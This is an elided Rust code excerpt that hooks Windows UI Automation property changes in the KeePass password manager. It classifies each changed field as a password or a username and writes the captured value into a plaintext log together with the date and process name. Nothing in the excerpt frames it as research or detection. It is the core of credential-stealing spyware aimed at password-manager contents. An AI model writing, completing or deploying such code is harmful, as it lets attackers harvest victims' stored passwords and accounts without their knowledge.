...
pub fn create_keepass_handler(logger: Arc<Mutex<Logger>>) -> Box<dyn Fn(&IUIAutomationElement, &str, &str, UIA_PROPERTY_ID, BSTR) -> Result<()> + Send + Sync> {
    Box::new(move |element, process_name, date, property_id, new_value| {
        match property_id {
            UIA_ValueValuePropertyId | UIA_NamePropertyId => {
                handle_keepass_property_change(element, process_name, date, property_id, new_value, logger.clone())
            }
...
fn handle_keepass_property_change(
    ...
    let field_type = if field_name.to_lowercase().contains("password") {
        "Password"
    } else {
        "Username"
    };
    ...
    let log_message = format!(
        "{} {} [KeePass Entry]\nField Type: {}\nValue: {}\n",
        date, process_name, field_type, field_value
    );
